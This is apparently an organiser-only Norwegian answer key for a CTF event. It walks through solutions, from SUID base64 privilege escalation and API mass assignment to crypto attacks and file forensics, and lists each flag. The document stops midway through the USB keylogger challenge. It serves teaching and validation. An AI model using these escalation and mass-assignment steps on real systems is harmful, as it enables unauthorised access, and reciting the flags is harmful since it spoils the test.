# Løsningswriteups for CTF-oppgaver

Dette dokumentet er for arrangører og validering. Det skal ikke følge
deltakerpakken som genereres i `release/`.

## Innhold

- [Servicekontoen](#linux-01-servicekonto)
- [Leverandørregisteret](#api-01-leverandorregister)
- [Vaktnotatet](#crypto-01-xor-vakt)
- [Skiftprotokollen](#crypto-02-skiftprotokoll)
- [Beredskapsfrasen](#crypto-03-vigenere-beredskap)
- [To nøkler, samme modul](#crypto-04-rsa-felles-modulus)
- [Sensorstrømmen](#crypto-05-lcg-sensorstrom)
- [Raymonds RSA](#crypto-06-raymond-rsa)
- [Skiftkortene](#crypto-07-skiftkortene)
- [Samme strøm to ganger](#crypto-08-gjenbrukt-nokkelstrom)
- [USB fra standen](#forensics-01-usb-stand)
- [Mailspor](#forensics-02-mailspor)
- [Stand-PC-en](#forensics-03-stand-pc)
- [Brukeragenten](#forensics-04-brukeragenten)
- [Det glemte committet](#forensics-05-glemt-commit)
- [Klippet og limt](#forensics-06-klippet-limt)
- [Tasteloggen](#forensics-07-tasteloggen)
- [Slettet skiftlogg](#forensics-08-slettet-skiftlogg)
- [Vedlegget i rapporten](#forensics-09-vedlegget-i-pdf)
- [Arkivportalen](#password-01-arkivportal)
- [Velkomststrøm](#misc-02-velkomststrom)
- [Morse på releet](#misc-03-morse-rele)
- [Tonevalg](#misc-04-tonevalg)
- [Radiovakten](#misc-05-radiovakten)
- [Registersporet](#misc-06-registersporet)
- [DNS i sidesporet](#network-01-dns-lekkasje)
- [Basic på tråden](#network-02-http-basic)
- [Finn scenen](#osint-01-finn-scenen)
- [Modbus i klartekst](#ot-01-modbus-klartekst)
- [Brønn under press](#ot-02-bop-modbus)
- [Ukryptert anlegg](#ot-03-mqtt)
- [HMI Tilgang](#ot-04-scada-sqli)
- [Historikkarkivet](#ot-05-historian-api)
- [Retur til vaktbua](#pwn-00-retur-vaktbua)
- [Buffer på boden](#pwn-01-buffer-boden)
- [Python-spionen](#re-01-pyc)
- [Crack meg](#re-02-crackme)
- [Virtuell maskin](#re-03-minivm)
- [Plakat med ekko](#stego-01-plakat-ekko)
- [Det blå skiltet](#stego-02-lsb-skilt)
- [Operatørportalen](#web-01-jwt)
- [Backup-lekkasje](#web-02-backup-lekkasje)
- [Not Your Badge](#web-03-not-your-badge)

<a id="linux-01-servicekonto"></a>

## Servicekontoen (`linux-01-servicekonto`)

**Kategori:** Linux
**Poeng:** 250
**Type:** SSH-container med lokal privilege escalation

**Hva oppgaven tester:** Deltakeren skal gjøre enkel Linux-rekognosering,
finne en feilkonfigurert SUID-binær, slå opp teknikken i GTFOBins og bruke den
til å lese en root-eid fil.

**Fremgangsmåte:**

1. Logg inn på serveren med SSH-informasjonen fra CTFd.
2. Bekreft bruker og tilgangsnivå:

   ```bash
   id
   ls -la /root /root/flag.txt
   ```

3. Let etter SUID-binærer:

   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

4. `/usr/bin/base64` skiller seg ut fordi den normalt ikke bør være SUID.
   Slå opp `base64` i GTFOBins og velg SUID-teknikken.
5. Les root-flagget:

   ```bash
   base64 /root/flag.txt | base64 -d
   ```

**Kontrollpunkter:**

- `/root/flag.txt` skal være `600 root:root`.
- `/usr/bin/base64` skal være SUID root, typisk `-rwsr-xr-x`.
- Oppgaven endrer ikke delt state når en deltaker løser den.

**Flagg:** `CTF{suid_b4se64_reads_r00t}`

<a id="api-01-leverandorregister"></a>

## Leverandørregisteret (`api-01-leverandorregister`)

**Kategori:** Web  
**Poeng:** 300  
**Type:** Flask REST API

**Hva oppgaven tester:** API-recon, debug-endepunkt og mass assignment.

**Fremgangsmåte:**

1. Start på `/` og gå videre til dokumentasjonen på `/ui`.
2. Dokumentasjonen viser vanlige ruter som `/api/v1/register`,
   `/api/v1/login`, `/api/v1/contracts` og `/openapi.json`.
3. Se etter debug-funksjoner. `/api/v1/_debug/routes` er åpent og avslører
   flere ruter og modellfeltene for bruker:

   ```json
   {"user": ["username", "password", "company", "role"]}
   ```

4. Registrer en bruker, men inkluder `role: "admin"` i JSON-kroppen. Dette
   virker fordi serveren kopierer hele request-objektet inn i brukerobjektet.

   ```bash
   curl -s -X POST <URL>/api/v1/register \
     -H 'Content-Type: application/json' \
     -d '{"username":"validering","password":"x","company":"Test AS","role":"admin"}'
   ```

5. Logg inn med samme bruker og hent token:

   ```bash
   curl -s -X POST <URL>/api/v1/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"validering","password":"x"}'
   ```

6. Bruk tokenet mot den interne ruten:

   ```bash
   curl -s <URL>/api/v1/internal/beredskap \
     -H "Authorization: Bearer <TOKEN>"
   ```

   Flagget ligger i `beredskapskode`.

**Kontrollpunkter:**

- Vanlig supplier-bruker skal ikke få tilgang til `/api/v1/internal/beredskap`.
- Admin-rollen skal bare oppstå fordi `role` kan sendes inn ved registrering.
- Oppgaven er logisk hvis debug-ruten peker mot både skjult admin-rute og
  brukerfeltene.

**Flagg:** `CTF{api_mass_assignment_i_leverandorportalen}`

<a id="crypto-01-xor-vakt"></a>

## Vaktnotatet (`crypto-01-xor-vakt`)

**Kategori:** Crypto  
**Poeng:** 100  
**Type:** Statisk fil

**Hva oppgaven tester:** Repeating-key XOR og crib-dragging.

**Fremgangsmåte:**

1. Last ned `vaktnotat.bin` eller `vaktnotat.hex`. Begge representerer samme
   ciphertext.
2. Start med filtype og entropi/struktur:

   ```bash
   file vaktnotat.bin
   xxd -l 64 vaktnotat.bin
   strings -a vaktnotat.bin
   ```

   Filen har ingen magisk header som ZIP/PNG/PDF, og `strings` gir ikke lesbar
   tekst. Det peker mot enkel bytevis transformasjon heller enn et vanlig
   filformat.

3. Bruk hintet om at vaktnotater ofte nevner `Teknologidagene` som kjent
   klartekst, en klassisk crib. I CyberChef kan man bruke `From Hex` hvis man
   bruker `.hex`-filen, deretter prøve `XOR Brute Force` eller `XOR` med
   nøkkellengder rundt 4-8.

4. En ryddig manuell crib-dragging-metode er å flytte teksten
   `Teknologidagene` over ciphertexten og XOR-e den mot hvert mulig offset.
   Når resultatet ser ut som en kort, gjentakende ASCII-nøkkel, har man funnet
   riktig offset. Det kan gjøres med noen linjer Python uten å vite nøkkelen:

   ```python
   from pathlib import Path

   ct = Path("vaktnotat.bin").read_bytes()
   crib = b"Teknologidagene"

   for offset in range(len(ct) - len(crib)):
       candidate = bytes(a ^ b for a, b in zip(ct[offset:], crib))
       if all(32 <= b < 127 for b in candidate):
           print(offset, candidate)
   ```

   Riktig treff gir en periodisk variant av `NORDVERK`.

5. XOR hele ciphertexten med repeating key `NORDVERK`. I CyberChef: `XOR`, key
   `NORDVERK`, mode `UTF-8`/tekst. I terminal/Python:

   ```python
   from itertools import cycle
   from pathlib import Path

   ct = Path("vaktnotat.bin").read_bytes()
   key = b"NORDVERK"
   print(bytes(c ^ k for c, k in zip(ct, cycle(key))).decode())
   ```

6. Les linjen med natteskiftets hemmelige tilgangskode.

**Kontrollpunkter:**

- En deltaker kan løse dette manuelt i CyberChef med XOR-key `NORDVERK`.
- Alternativt kan de skrive et lite script, men poenget er å oppdage
  repeating-key XOR og kjent klartekst.
- Dekryptert tekst skal være norsk/lesbar og inneholde flagget eksplisitt.

**Flagg:** `CTF{xor_v4kt_kr1bbsk1lt}`

<a id="crypto-02-skiftprotokoll"></a>

## Skiftprotokollen (`crypto-02-skiftprotokoll`)

**Kategori:** Crypto  
**Poeng:** 75  
**Type:** Statisk fil

**Hva oppgaven tester:** Caesar/ROT med norsk alfabet.

**Fremgangsmåte:**

1. Åpne `skiftprotokoll.txt`. Teksten ser ut som normal bokstavtekst, men
   ordene gir ikke mening.
2. Gjenkjenn at dette er en monoalfabetisk rotasjon/Caesar: samme tegn blir
   alltid samme tegn, mellomrom/tegnsetting er bevart, og teksten er kort nok
   til å teste alle skift.
3. Siden teksten bruker norske tegn, må alfabetet være:

   ```text
   ABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ
   ```

4. Test alle 29 mulige skift. Dette kan gjøres i CyberChef med ROT/Caesar
   over tilpasset alfabet, eller med en liten brute force som ikke antar
   løsningen:

   ```python
   alfabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ"
   tekst = open("skiftprotokoll.txt", encoding="utf-8").read()

   for shift in range(len(alfabet)):
       out = []
       for ch in tekst:
           upper = ch.upper()
           if upper in alfabet:
               decoded = alfabet[(alfabet.index(upper) - shift) % len(alfabet)]
               out.append(decoded if ch.isupper() else decoded.lower())
           else:
               out.append(ch)
       print("\n--- shift", shift, "---")
       print("".join(out))
   ```

5. Riktig skift er `11`. Da blir meldingen lesbar og flagget står i klartekst.

**Kontrollpunkter:**

- Hvis man bruker kun engelsk alfabet, blir norske tegn feil. Det er en
  tilsiktet liten friksjon.
- Oppgaven er lett fordi det bare finnes 29 muligheter.

**Flagg:** `CTF{rot_med_norsk_alfabet}`

<a id="crypto-03-vigenere-beredskap"></a>

## Beredskapsfrasen (`crypto-03-vigenere-beredskap`)

**Kategori:** Crypto  
**Poeng:** 150  
**Type:** Statisk fil

**Hva oppgaven tester:** Vigenere og nøkkelgjetting fra tema.

**Fremgangsmåte:**

1. Åpne `beredskap.txt`. Mellomrom, linjeskift, `{` og `}` er bevart, mens
   bokstavene er byttet ut. Det utelukker base64/hex og peker mot klassisk
   substitusjon.

2. Prøv først Caesar/ROT som kontroll. Alle linjene forblir uleselige ved ett
   fast skift, som tyder på polyalfabetisk substitusjon, typisk Vigenere.

3. Bruk flaggformatet som kjent klartekst. Cipherteksten inneholder:

   ```text
   IGEXQRH VU XXW{fvuvqzvv_oe_tfuowrdg_ycdnwzurf}
   ```

   Klarteksten for starten av den linjen er svært sannsynlig:

   ```text
   FLAGGET ER CTF{
   ```

   Ved Vigenere finner man nøkkelbokstavene ved å sammenligne plaintext og
   ciphertext bokstav for bokstav. Fordi nøkkelindeksen fortsetter gjennom
   hele teksten, får man først en rotert del av den periodiske nøkkelen.
   Sammenlign flere bokstaver og roter resultatet til `NORDVERK`.

4. Bekreft nøkkelen i et verktøy før du antar den. I CyberChef: bruk
   `Vigenere Decode` med key `NORDVERK`. I terminal kan man validere slik:

   ```python
   import string

   key = "NORDVERK"
   text = open("beredskap.txt", encoding="utf-8").read()
   out = []
   i = 0
   for ch in text:
       base = "A" if ch.isupper() else "a"
       if ch.upper() in string.ascii_uppercase:
           shift = ord(key[i % len(key)]) - ord("A")
           out.append(chr((ord(ch) - ord(base) - shift) % 26 + ord(base)))
           i += 1
       else:
           out.append(ch)
   print("".join(out))
   ```

5. Meldingen blir norsk/lesbar, og flagget står eksplisitt i klartekst.

**Kontrollpunkter:**

- Nøkkelen kan utledes fra kjent klartekst/format, ikke bare gjettes fra tema.
- Når nøkkelen er riktig, kommer hele meldingen ut som sammenhengende norsk.

**Flagg:** `CTF{vigenere_er_fortsatt_klassiker}`

<a id="crypto-04-rsa-felles-modulus"></a>

## To nøkler, samme modul (`crypto-04-rsa-felles-modulus`)

**Kategori:** Crypto  
**Poeng:** 275  
**Type:** Statisk JSON

**Hva oppgaven tester:** RSA common modulus attack.

**Fremgangsmåte:**

1. Åpne `rsa_felles_modulus.json`. Den inneholder samme `n`, to eksponenter
   `e1`, `e2`, og to ciphertexts `c1`, `c2`.
2. Se at meldingen er kryptert med samme modulus, men ulike offentlige
   eksponenter. Når `gcd(e1, e2) = 1`, finnes det tall `a` og `b` slik at:

   ```text
   a*e1 + b*e2 = 1
   ```

3. Finn `a` og `b` med utvidet Euklids algoritme.
4. Beregn:

   ```text
   m = c1^a * c2^b mod n
   ```

   Hvis `a` eller `b` er negativ, bruk modulær invers av den aktuelle
   ciphertexten.
5. Konverter heltallet `m` til bytes og dekod som tekst.

   En verifiserbar Python-metode, uten faktorisering av `n`, er:

   ```python
   import json

   data = json.load(open("rsa_felles_modulus.json"))
   n, e1, e2 = data["n"], data["e1"], data["e2"]
   c1, c2 = data["c1"], data["c2"]

   def egcd(a, b):
       if b == 0:
           return a, 1, 0
       g, x, y = egcd(b, a % b)
       return g, y, x - (a // b) * y

   def signed_pow(base, exp, mod):
       if exp >= 0:
           return pow(base, exp, mod)
       return pow(pow(base, -1, mod), -exp, mod)

   g, a, b = egcd(e1, e2)
   assert g == 1
   m = (signed_pow(c1, a, n) * signed_pow(c2, b, n)) % n
   print(m.to_bytes((m.bit_length() + 7) // 8, "big").decode())
   ```

**Kontrollpunkter:**

- Dette skal ikke kreve faktorisering av `n`.
- `e1` og `e2` må være relativt primiske.
- Resultatet skal være flagget direkte, ikke en ny kryptert blob.

**Flagg:** `CTF{rsa_common_modulus_gjor_vondt}`

<a id="crypto-05-lcg-sensorstrom"></a>

## Sensorstrømmen (`crypto-05-lcg-sensorstrom`)

**Kategori:** Crypto  
**Poeng:** 400  
**Type:** Statisk JSON

**Hva oppgaven tester:** Svak PRNG brukt som stream cipher.

**Fremgangsmåte:**

1. Åpne `sensorstrom.json`. Den inneholder modulus `m`, fire lekkede
   påfølgende LCG-outputer og ciphertext i hex.
2. LCG-formen er:

   ```text
   x[n+1] = (a*x[n] + c) mod m
   ```

3. Fordi outputene er påfølgende, kan parameterne rekonstrueres direkte. Bruk
   tre påfølgende lekkede outputer til å løse `a`:

   ```text
   a = (x2 - x1) * inverse(x1 - x0, m) mod m
   ```

4. Finn `c`:

   ```text
   c = x1 - a*x0 mod m
   ```

5. Verifiser parameterne mot den fjerde lekkede outputen:

   ```text
   (a*x2 + c) mod m == x3
   ```

6. Generer videre outputer fra siste kjente output. Hver output blir fire
   bytes big-endian nøkkelstrøm, slik `note`-feltet i JSON beskriver.
7. XOR nøkkelstrømmen mot ciphertexten og les flagget:

   ```python
   import json

   data = json.load(open("sensorstrom.json"))
   m = data["modulus"]
   x0, x1, x2, x3 = data["leaked_consecutive_outputs"]
   ct = bytes.fromhex(data["ciphertext_hex"])

   a = ((x2 - x1) * pow((x1 - x0) % m, -1, m)) % m
   c = (x1 - a * x0) % m
   assert (a * x2 + c) % m == x3

   stream = bytearray()
   x = x3
   while len(stream) < len(ct):
       x = (a * x + c) % m
       stream.extend(x.to_bytes(4, "big"))

   pt = bytes(c ^ k for c, k in zip(ct, stream))
   print(pt.decode())
   ```

**Kontrollpunkter:**

- Det er ikke AES eller ekte kryptografisk stream cipher. Svakheten er at LCG
  kan rekonstrueres fra lekkede outputer.
- Hvis inversen ikke finnes for feil indeksvalg, prøv neste påfølgende trippel.
- Dekryptert plaintext starter med `CTF{`.

**Flagg:** `CTF{lcg_er_ikke_streamkrypto}`

<a id="crypto-06-raymond-rsa"></a>

## Raymonds RSA (`crypto-06-raymond-rsa`)

**Kategori:** Crypto
**Poeng:** 225
**Type:** Statisk JSON

**Hva oppgaven tester:** Klassisk RSA-dekryptering når `n` kan faktoriseres
fordi primtallene ligger for nær hverandre.

**Fremgangsmåte:**

1. Åpne `raymond_rsa.json`. Den inneholder offentlig eksponent `e`, modulus
   `n` og ciphertext `c`.
2. Gjenkjenn vanlig RSA:

   ```text
   c = m^e mod n
   ```

   For å dekryptere trenger man privat eksponent `d`, og den får man først når
   `n` er faktorisert til `p*q`.

3. `n` er for stort for naiv trial division, men teksten/hintet peker mot at
   primtallene er valgt litt for ryddig. Når `p` og `q` er nær hverandre, bruk
   Fermats faktoriseringsmetode:

   ```text
   n = a^2 - b^2 = (a-b)(a+b)
   ```

4. Start med `a = ceil(sqrt(n))`. Øk `a` til `a^2 - n` er et perfekt kvadrat.
   Da er `p = a-b` og `q = a+b`.

5. Dekrypter med vanlig RSA:

   ```python
   import json
   import math

   data = json.load(open("raymond_rsa.json"))
   e, n, c = data["e"], data["n"], data["c"]

   a = math.isqrt(n)
   if a * a < n:
       a += 1

   while True:
       b2 = a * a - n
       b = math.isqrt(b2)
       if b * b == b2:
           break
       a += 1

   p = a - b
   q = a + b
   assert p * q == n

   phi = (p - 1) * (q - 1)
   d = pow(e, -1, phi)
   m = pow(c, d, n)
   print(m.to_bytes((m.bit_length() + 7) // 8, "big").decode())
   ```

6. Plaintexten er flagget.

**Kontrollpunkter:**

- Dette er ikke common modulus-angrepet fra `crypto-04`; her finnes bare én
  offentlig nøkkel.
- Fermat-faktorisering skal finne faktorene raskt fordi `p` og `q` ligger nær
  hverandre.
- Etter dekryptering skal plaintext være direkte `CTF{...}`.

**Flagg:** `CTF{ferm4t_fant_raymonds_primer}`

<a id="crypto-07-skiftkortene"></a>

## Skiftkortene (`crypto-07-skiftkortene`)

**Kategori:** Crypto
**Poeng:** 175
**Type:** Statisk tekstfil

**Hva oppgaven tester:** Blokkvis transposisjon, kjent klartekst og invers
permutasjon.

**Fremgangsmåte:**

1. Åpne `skiftkort.txt`. Filen inneholder to kjente par, der både opprinnelig
   tekst og stokket tekst er oppgitt, samt én ukjent stokket melding.
2. Legg merke til at tegnene ikke er byttet ut med andre tegn. De samme tegnene
   finnes, bare på nye posisjoner.
3. Bruk det første kjente paret til å bygge posisjonskartet. Den kjente
   klarteksten har unike tegn, så hvert tegn i `KJENT_SENDT_1` kan slås opp i
   `KJENT_KLAR_1`:

   ```python
   permutasjon = [kjent_klar.index(tegn) for tegn in kjent_sendt]
   ```

4. Kontroller kartet mot det andre kjente paret. Dette er et godt sted å fange
   opp om man har laget kartet motsatt vei.
5. Del `UKJENT_SENDT` i blokker på samme lengde som kalibreringskortene.
6. For hver chifferposisjon plasseres tegnet tilbake til opprinnelig posisjon:

   ```python
   klar = ["?"] * len(blokk)
   for ut_pos, inn_pos in enumerate(permutasjon):
       klar[inn_pos] = blokk[ut_pos]
   ```

7. Slå sammen blokkene og fjern fylltegnet `~`.

**Kontrollpunkter:**

- Første kjente klartekst skal ha bare unike tegn.
- Andre kjente par skal dekodes riktig med samme permutasjon.
- Den ukjente meldingen skal ende i et lesbart `CTF{...}` flagg.

**Flagg:** `CTF{samme_permutasjon_hver_gang}`

<a id="crypto-08-gjenbrukt-nokkelstrom"></a>

## Samme strøm to ganger (`crypto-08-gjenbrukt-nokkelstrom`)

**Kategori:** Crypto
**Poeng:** 200
**Type:** Statisk JSON

**Hva oppgaven tester:** XOR og faren ved å gjenbruke samme nøkkelstrøm.

**Fremgangsmåte:**

1. Åpne `samband.json`. Den inneholder `known_plaintext_a`,
   `ciphertext_a_hex` og `ciphertext_b_hex`.
2. Dekod hexverdiene til bytes. Dette kan gjøres i CyberChef med `From Hex`
   eller i Python med `bytes.fromhex`.
3. Fordi XOR er sin egen inverse kan nøkkelstrømmen for pakke A hentes ut:

   ```text
   stream = plaintext_a XOR ciphertext_a
   ```

4. Bruk samme strøm fra byte null på pakke B:

   ```text
   plaintext_b = ciphertext_b XOR stream
   ```

5. I CyberChef er en ryddig vei:

   ```text
   From Hex(ciphertext_a) XOR known_plaintext_a = stream
   From Hex(ciphertext_b) XOR stream = plaintext_b
   ```

6. Et kort Python-script er også naturlig her, siden operasjonen er ren
   byte-XOR:

   ```python
   import json

   data = json.load(open("samband.json"))
   known = data["known_plaintext_a"].encode()
   ca = bytes.fromhex(data["ciphertext_a_hex"])
   cb = bytes.fromhex(data["ciphertext_b_hex"])

   stream = bytes(a ^ b for a, b in zip(known, ca))
   plain_b = bytes(a ^ b for a, b in zip(cb, stream))
   print(plain_b.decode())
   ```

**Kontrollpunkter:**

- Deltakeren trenger ikke gjette en passordnøkkel.
- Feilen er at samme nøkkelstrøm brukes på nytt fra starten.
- Pakke B skal dekodes til lesbar norsk tekst med flagget i teksten.

**Flagg:** `CTF{aldri_gjenbruk_en_nokkelstrom}`

<a id="forensics-01-usb-stand"></a>

## USB fra standen (`forensics-01-usb-stand`)

**Kategori:** Forensics  
**Poeng:** 150
**Type:** ZIP med SQLite, nedlastinger og fotoarkiv

**Hva oppgaven tester:** Browser/download-forensics, filtriage, nested arkiv,
metadata/strings og enkel base64-dekoding.

**Fremgangsmåte:**

1. Pakk ut `usb_fra_standen.zip`.
2. Inspiser innholdet før du åpner tilfeldige filer:

   ```bash
   unzip -l usb_fra_standen.zip
   mkdir usb && unzip usb_fra_standen.zip -d usb
   find usb -maxdepth 2 -type f -print
   cd usb
   ```

   Du skal se `history.sqlite`, en `downloads/`-mappe, `notes/` og litt
   vanlig stand-støy.

3. Identifiser databasen og se schema:

   ```bash
   file history.sqlite
   sqlite3 history.sqlite ".schema"
   ```

   Browser-/download-historikk er ofte SQLite. Her er det naturlig å se etter
   tabeller som `downloads`.

4. List nedlastinger sortert på tid:

   ```bash
   sqlite3 history.sqlite \
     "SELECT target_path, tab_url, start_time, received_bytes FROM downloads ORDER BY start_time DESC;"
   ```

   Den aller siste nedlastingen er en lunsjkvittering, men den interessante
   nedlastingen rett før er `standfoto_mai.zip` fra delt standfoto-lenke.

5. Inspiser arkivet:

   ```bash
   unzip -l downloads/standfoto_mai.zip
   mkdir standfoto
   unzip downloads/standfoto_mai.zip -d standfoto
   find standfoto -maxdepth 3 -type f -print
   ```

   Arkivet inneholder mange små PNG-er og en manifest. Manifesten sier at
   metadata i bildefilene er bevart.

6. Bruk `strings` på bildefilene og se etter avvikende metadata:

   ```bash
   strings -a standfoto/bilder/*.png | grep "cache_ref"
   ```

   `bilder/IMG_0421.png` inneholder en `cache_ref`:

   ```text
   cache_ref=S0F7dXNiX2gxc3Rfc3FsaXRlX2pha3RldH0=
   ```

7. Dekod verdien:

   ```bash
   printf 'S0F7dXNiX2gxc3Rfc3FsaXRlX2pha3RldH0=' | base64 -d
   ```

**Kontrollpunkter:**

- Oppgaven bør kunne løses med `unzip`, `sqlite3`, `file`, `strings`, `rg` og
  `base64`.
- SQLite-sporet skal peke deltakerne mot fotoarkivet, men ikke direkte til
  hvilken bildefil som inneholder metadataen.
- `notes/ikke_flagg.txt` skal ikke inneholde en gyldig `CTF{...}`-distraksjon.

**Flagg:** `CTF{usb_h1st_sqlite_jaktet}`

<a id="forensics-02-mailspor"></a>

## Mailspor (`forensics-02-mailspor`)

**Kategori:** Forensics  
**Poeng:** 150  
**Type:** EML

**Hva oppgaven tester:** E-postheaders, MIME og base64-vedlegg.

**Fremgangsmåte:**

1. Start med å se at filen faktisk er e-post/MIME:

   ```bash
   file mistenkelig_epost.eml
   sed -n '1,120p' mistenkelig_epost.eml
   ```

2. Les headers: `From`, `Reply-To`, `Return-Path` og `Authentication-Results`
   gir phishing-kontekst, men flagget ligger ikke i headerne.

3. Finn MIME-delene:

   ```bash
   grep -n "Content-Type\|Content-Disposition\|filename\|base64" mistenkelig_epost.eml
   ```

   E-posten har et HTML-vedlegg, `konferanse-login.html`, og delen er base64-kodet.

4. Eksporter vedlegget med et MIME-verktøy eller dekod base64-blokken manuelt.
   Med Python sin standardbibliotekspakke kan man gjøre det uten å kjenne
   løsningen:

   ```python
   from email import policy
   from email.parser import BytesParser
   from pathlib import Path

   msg = BytesParser(policy=policy.default).parsebytes(Path("mistenkelig_epost.eml").read_bytes())
   for part in msg.walk():
       name = part.get_filename()
       if name:
           Path(name).write_bytes(part.get_payload(decode=True))
           print("skrev", name)
   ```

5. Åpne HTML-en som tekst:

   ```bash
   sed -n '1,160p' konferanse-login.html
   ```

   Ikke stol på rendret nettleservisning; kommentarer og skjulte URL-parametre
   er ofte synlige bare i kilden.
6. Flagget finnes i HTML-kommentar eller i den falske login-URL-en.

**Kontrollpunkter:**

- Valider at vedlegget faktisk ligger i `.eml`, og at det ikke kreves nettverk.
- Spilleren skal kunne finne flagget med ren tekstinspeksjon etter MIME-dekoding.

**Flagg:** `CTF{mail_h3ad3rs_og_m1me}`

<a id="forensics-03-stand-pc"></a>

## Stand-PC-en (`forensics-03-stand-pc`)

**Kategori:** Forensics  
**Poeng:** 250  
**Type:** ZIP med nettleserprofil

**Hva oppgaven tester:** Browser-profile forensics og cookie-database.

**Fremgangsmåte:**

1. Pakk ut `stand_pc.zip`.
2. Gå gjennom strukturen:

   ```bash
   unzip -l stand_pc.zip
   mkdir standpc && unzip stand_pc.zip -d standpc
   find standpc -type f -print
   ```

   Den relevante profilstien er:

   ```text
   Users/standbruker/AppData/Local/ConferenceBrowser/User Data/Default/
   ```

3. Bekreft at `History` og `Cookies` er SQLite-databaser:

   ```bash
   cd "standpc/Users/standbruker/AppData/Local/ConferenceBrowser/User Data/Default"
   file *
   sqlite3 History ".tables"
   sqlite3 Cookies ".tables"
   ```

4. `History` gir kontekst, men `Cookies` er hovedsporet. Åpne `Cookies` med
   SQLite og list relevante felter:

   ```bash
   sqlite3 Cookies "SELECT host_key, name, value FROM cookies;"
   ```

5. Finn cookien `stand_session`. Den skiller seg ut fordi verdien ligner base64,
   ikke en vanlig kort preferanseverdi.
6. Base64-dekod verdien:

   ```bash
   echo '<COOKIE_VALUE>' | base64 -d
   ```

**Kontrollpunkter:**

- `stand_session` skal skille seg ut fra vanlige preferanse-cookies.
- Oppgaven er statisk og krever ikke at man kjører nettleseren.

**Flagg:** `CTF{historikken_husker_mer}`

<a id="forensics-04-brukeragenten"></a>

## Brukeragenten (`forensics-04-brukeragenten`)

**Kategori:** Forensics
**Poeng:** 100
**Type:** Statisk PCAP

**Hva oppgaven tester:** HTTP-rekognosering i PCAP, telling av User-Agent
verdier og identifisering av avvikende verktøytrafikk.

**Fremgangsmåte:**

1. Åpne `brukeragenten.pcap` i Wireshark.
2. Filtrer på HTTP requests:

   ```text
   http.request
   ```

3. Legg til `http.user_agent` som kolonne, eller filtrer direkte på feltet:

   ```text
   http.user_agent
   ```

4. Sammenlign verdiene. Vanlige klienter som Firefox, Chrome, curl og
   `Nordverk-Update` dukker opp noen få ganger hver.
5. Én verdi skiller seg ut fordi den står i klart flest forespørsler:

   ```text
   Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)
   ```

6. Normaliser verktøynavn og versjon etter flaggformatet.

Terminalbasert kontroll:

```bash
tshark -r brukeragenten.pcap -Y http.user_agent \
  -T fields -e http.user_agent | sort | uniq -c | sort -nr
```

Arrangørsolveren leser HTTP headerne fra pakkedata og teller verdiene:

```bash
python3 solver/solve.py
```

**Kontrollpunkter:**

- PCAP-en skal inneholde både normal trafikk og tydelig skannertrafikk.
- Løsningen skal kunne finnes uten å kjenne Nikto på forhånd, siden navn og
  versjon står i headeren.

**Flagg:** `CTF{nikto_2.5.0}`

<a id="forensics-05-glemt-commit"></a>

## Det glemte committet (`forensics-05-glemt-commit`)

**Kategori:** Forensics
**Poeng:** 150
**Type:** Git repository i ZIP

**Hva oppgaven tester:** Git-forensics, slettede filer i historikk og uthenting
av filinnhold fra tidligere commits.

**Fremgangsmåte:**

1. Pakk ut `arkivsynk.zip` og gå inn i `arkivsynk`.
2. Bekreft at `.git` er med:

   ```bash
   git status
   git log --all --oneline
   ```

3. Se etter commits som slettet filer:

   ```bash
   git log --all --diff-filter=D --summary
   ```

4. Commitmeldingen `Fjern lokal konfigurasjon før deling` peker mot filen
   `config/datasync.env`.
5. Les filen slik den var før sletting:

   ```bash
   git show <slettecommit>^:config/datasync.env
   ```

6. Verdien `ARCHIVE_RECOVERY_CODE` inneholder flagget.

En mer systematisk kontroll er å søke gjennom alle revisjoner:

```bash
for rev in $(git rev-list --all); do git grep -n 'CTF{' "$rev"; done
```

Arrangørsolver:

```bash
python3 solver/solve.py
```

**Kontrollpunkter:**

- Siste arbeidsmappe skal ikke inneholde `config/datasync.env`.
- Flagget skal finnes i historikken, ikke i nåværende filsett.
- Oppgaven skal kunne løses med standard `git` kommandoer.

**Flagg:** `CTF{historikken_husker_alt}`

<a id="forensics-06-klippet-limt"></a>

## Klippet og limt (`forensics-06-klippet-limt`)

**Kategori:** Forensics
**Poeng:** 200
**Type:** Statisk binærfil

**Hva oppgaven tester:** Filsignaturer, blokkbasert deinterleaving og enkel
rekonstruksjon av flere PNG filer fra én flettet strøm.

**Fremgangsmåte:**

1. Start med å identifisere filen:

   ```bash
   file utklipp.bin
   xxd -l 1600 utklipp.bin
   binwalk utklipp.bin
   ```

2. Filen er ikke én gyldig PNG, men de første PNG signaturene dukker opp på
   offset `0`, `512` og `1024`.
3. Avstanden viser at filen består av tre strømmer med 512 byte blokker:

   ```text
   bilde1 blokk0, bilde2 blokk0, bilde3 blokk0,
   bilde1 blokk1, bilde2 blokk1, bilde3 blokk1, ...
   ```

4. Del filen i grupper på `3 * 512` byte. Legg første blokk i bilde 1, andre
   blokk i bilde 2 og tredje blokk i bilde 3. Gjenta til slutten.
5. Trim hver rekonstruerte strøm etter PNG sin `IEND` chunk.
6. Åpne de tre bildene og les fragmentene i rekkefølge.

Manuell rekonstruksjon i Python:

```python
from pathlib import Path

blob = Path("utklipp.bin").read_bytes()
block = 512
streams = [bytearray() for _ in range(3)]

for group in range(0, len(blob), block * 3):
    for index in range(3):
        streams[index] += blob[group + index * block:group + (index + 1) * block]

for index, data in enumerate(streams, 1):
    end = data.index(b"\x00\x00\x00\x00IEND") + 12
    Path(f"rekonstruert-{index}.png").write_bytes(data[:end])
```

Arrangørsolveren gjør samme rekonstruksjon og leser fragmentene fra komprimert
PNG metadata:

```bash
python3 solver/solve.py
```

**Kontrollpunkter:**

- `strings utklipp.bin` skal ikke gi hele flagget direkte.
- De rekonstruerte PNG-ene skal åpne normalt og vise hvert sitt fragment.
- Blokkstørrelsen skal kunne utledes fra de jevne PNG signaturene.

**Flagg:** `CTF{blokker_flettet_tre_veier}`

<a id="forensics-07-tasteloggen"></a>

## Tasteloggen (`forensics-07-tasteloggen`)

**Kategori:** Forensics
**Poeng:** 225
**Type:** USB PCAP

**Hva oppgaven tester:** USB HID keyboard-forensics, modifier bytes og
oversetting fra keycodes til tekst.

**Fremgangsmåte:**

1. Åpne `tasteloggen.pcap` i Wireshark.
2. Filtrer på interrupt transfers med data:

   ```text
   usb.transfer_type == 0x01 && usb.capdata
   ```

3. Tastaturrapportene er 8 byte. Første byte er modifier, andre byte er
   reservert, og tastene ligger i byte 2 til 7.
